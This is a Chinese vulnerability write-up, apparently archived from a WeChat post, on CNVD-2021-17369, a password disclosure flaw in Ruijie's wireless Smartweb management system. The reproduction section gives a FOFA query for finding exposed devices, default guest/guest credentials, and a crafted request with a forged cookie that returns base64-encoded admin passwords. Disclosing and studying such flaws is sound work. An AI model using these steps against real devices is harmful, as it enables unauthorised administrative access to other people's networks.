---
cnvd: "CNVD-2021-17369"
fofa: "title="
source: "MrWQ/vulnerability-paper"
---

# 锐捷 Smartweb 管理系统 密码信息泄露漏洞 CNVD-2021-17369 (1day~)

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/nvk4Nu8q8AxeuPDPygllWA)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**一****：漏洞描述🐑**

**锐捷网络股份有限公司无线 smartweb 管理系统存在逻辑缺陷漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。**

**二:  漏洞影响🐇**

**锐捷网络股份有限公司 无线 smartweb 管理系统**

**三:  漏洞复现🐋**

```
FOFA: title="无线smartWeb--登录页面"
```

登录页面如下

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3MpEyfmBpzLq03e54eGXvbib8pS8bWOiaGva7L0icNoDxHgj5UxwbhcMpQ/640?wx_fmt=png)

**然后找到了一个设备存在管理 admin 员的弱口令，进去后发现 Web CLI 控制台**

**翻文件的过程中发现一个文件很有意思，运行命令查看**

```
more /web/xml/webuser-auth.xml
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG30c4teS9LWDOnFBDfr7KRDOQzLfLFhLyXsqRia2OxCHeLcB8srjbRGjA/640?wx_fmt=png)

**里面存在所有人的账号密码**

**默认存在 guest 账户，账号密码为 **guest/guest****

**其中登录的过程中搜索 admin 的数据后发现请求了一个文件 **/web/xml/webuser-auth.xml**，而且响应中包含了 admin 密码的 base64 加密**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG38XyyHjYJNvTFcNCrjAzrm492XBT4BOFuticQQqOxetq0qhbmibf2Emng/640?wx_fmt=png)

**解密就可以获得 admin 管理员的密码，尝试直接请求**  

```
http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml

Cookie添加
Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3LvfiaJ0xOGYz3Q27COtibpbib6dl2jPYBfuZIBV2C4kvP1jlOiaE7UIKpA/640?wx_fmt=png)

 ****四:  Goby & POC🦉****

```
已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中
Ruijie_smartweb_password_information_disclosure
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3PDfEJs8FjRdbzFqiaOTx1C9zb0BWiaRP4iaDVNN8NKxZ4OogVQaKicpbpQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3vcLkH0iagWFia8GTmWYbH5cSZD4DHdSaNic73RiaHqWFkorxuKIo8dicBxA/640?wx_fmt=png)

 ****五:  关于文库🦉****

**在线文库：**

**http://wiki.peiqi.tech**

**Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

最后
--

> 下面就是文库和团队的公众号啦，更新的文章都会在第一时间推送在交流群和公众号，想要投稿的加我一起建设文库~
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3oFxduIZusbktTovD18wqMFpp8xLtZ1ZaPOghhV1eQhyKJ7NflN8zSw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3w19aTRfNYGuKWCK5UvmhXPzbS6nqklyPnPuECevR1MzdvONpgnGrZw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3dHkvubfZibTpUsjs9H7Qq521dseDtibT2eBbib4F5gibDtXpTVLfKbcSYQ/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
